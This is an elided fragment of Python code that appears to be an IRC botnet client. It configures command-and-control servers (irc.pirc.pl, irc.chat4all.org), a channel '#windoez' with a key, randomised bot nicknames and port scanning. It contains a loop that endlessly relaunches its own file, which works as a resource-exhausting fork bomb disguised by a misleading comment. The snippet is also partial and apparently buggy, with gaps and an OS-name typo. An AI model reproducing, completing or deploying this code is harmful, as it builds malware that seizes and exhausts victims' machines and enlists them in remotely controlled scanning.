...
if os.name == "mt":
    os.popen("C:\\Users\\" + os.getenv("USERNAME") + "\\Freak\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")
else:
...
# skid shit b01
while 1:
     os.startfile(__file__) # back up file desciptors
...
if gonnaScan:
    ...
    print("[.] Currently we are scanning for " + portcount + " ports.")
...
hostlink = random.choice(loggedIPs.replace("\r","").split("\n")) # update later link
server = "irc.pirc.pl"  # irc server
channel = "#windoez"    # Channel to join for all the funzies
key = "swegfeg" # password

botnick = "cpu"+str(os.cpu_count())+"_" + str(random.randrange(0,999999999))+"."+os.name # Bot's nickname
 # Bot's nickname
...
server = "irc.chat4all.org"  # irc server
